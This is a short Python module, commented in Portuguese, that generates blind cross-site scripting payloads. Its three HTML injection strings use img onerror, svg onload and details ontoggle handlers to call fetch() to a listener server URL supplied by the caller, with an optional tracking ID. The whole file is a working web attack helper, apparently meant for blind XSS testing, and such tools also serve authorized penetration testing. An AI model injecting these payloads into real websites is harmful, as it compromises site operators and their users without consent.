def build_payloads(url_ouvinte, payload_id=None):
    """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
    payloads = []
    
    # Se foi fornecido um ID, adiciona como parâmetro na URL
    url_with_id = f"{url_ouvinte}?id={payload_id}" if payload_id else url_ouvinte
    
    payloads_models = [
        "<img src=x onerror=fetch('{url_ouvinte}')>",
        "<svg onload=fetch('{url_ouvinte}')>",
        "<details open ontoggle=fetch('{url_ouvinte}')>"
    ]

    for model in payloads_models:
        payloads.append(model.format(url_ouvinte=url_with_id))
    return payloads

def get_payload_types():
    """Retorna os tipos de payloads disponíveis"""
    return ['img', 'svg', 'details']
